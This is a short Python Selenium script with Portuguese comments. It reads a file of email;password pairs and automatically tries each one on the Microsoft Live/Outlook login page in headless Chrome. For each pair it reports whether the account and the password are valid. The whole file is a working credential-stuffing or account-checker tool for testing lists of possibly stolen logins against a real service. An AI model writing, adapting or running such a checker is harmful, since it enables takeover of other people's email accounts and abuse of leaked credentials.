#sudo apt-get install python-pip
#sudo pip install selenium

from webbrowser import Chrome
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import time

##abrir arquivo txt
print('Bem vindo ao teste das Credenciais.')
arquivo_email = open(input(r"Digite o caminho do arquivo "))
##ler o arquivo txt
lista_email = arquivo_email.readlines()
#variaveis
username_data = ""
password_data = ""
##printando o total de email no laço
print(len(lista_email))

chrome_options = Options()
chrome_options.add_argument('--headless')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-dev-shm-usage')

driver = webdriver.Chrome(chrome_options=chrome_options, executable_path="./chromedriver")

##laço de repetição da lista
for i in lista_email:
        #ler email e senha
        username_data, password_data = i.split(";")
        ##redireciona para o login
        driver.get("https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1647369148&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3ded5b1f66-c3ca-9cbf-e57f-6ab5823d57c5&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015")
        ##procura a elemento de email na pagina
        username = driver.find_element(By.ID, "i0116")
        ##insere o email
        username.send_keys(username_data)
        ##segundos pra redirecionar
        time.sleep(2)
        ##procura o elemento de senha na pagina
        password = driver.find_element(By.ID,"i0118")
        ##insere a senha
        password.send_keys(password_data)
        time.sleep(2)
        ##clica no botão entrar
        submit=driver.find_element(By.ID,'idSIButton9').click()
        time.sleep(4)
        ##continua
        login_attempt = driver.find_element(By.ID,'idSIButton9').click()
        time.sleep(5)
        try:
                driver.find_element(By.ID,'usernameError')
                print([username_data],'USUARIO INVALIDO')
        except:
                print([username_data],'USUARIO VALIDO')
        try:
                driver.find_element(By.ID,'passwordError')
                print([password_data],'SENHA INVALIDA\n')
                time.sleep(2)
        except:
                print([password_data],'SENHA VALIDA\n')

        ##redireciona e sai do email caso entre
        driver.get("https://login.live.com/logout.srf?ru=https%3A%2F%2Foutlook.live.com%2Fmail%2F0%2F")
        page_source = driver.page_source

#fecha o navegador        
driver.close()